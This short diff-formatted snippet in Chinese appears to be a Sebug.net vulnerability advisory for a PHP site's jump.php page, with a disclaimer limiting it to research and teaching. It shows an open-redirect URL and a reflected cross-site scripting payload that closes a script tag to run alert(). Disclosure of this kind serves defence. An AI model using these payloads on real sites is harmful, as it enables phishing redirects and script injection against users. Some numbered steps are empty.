@@ -1,0 +1,4 @@
+测试方法:
+
+@Sebug.net   dis
+本站提供程序(方法)可能带有攻击性,仅供安全研究与教学之用,风险自负!1.提交：http://127.0.0.1/dc/include/jump.php?gurl=http://00day.cn 会跳转到http://00day.cn2. 3.新手朋友会认为这就是这个跨站的利用了，其实不然，我们可以尝试去闭合他！但PHP有gpc限制，我们该怎么绕？4. 5.提交：http://127.0.0.1/dc/include/jump.php?gurl=%23"</script><script>alert(/00day.cn/)</script>/*
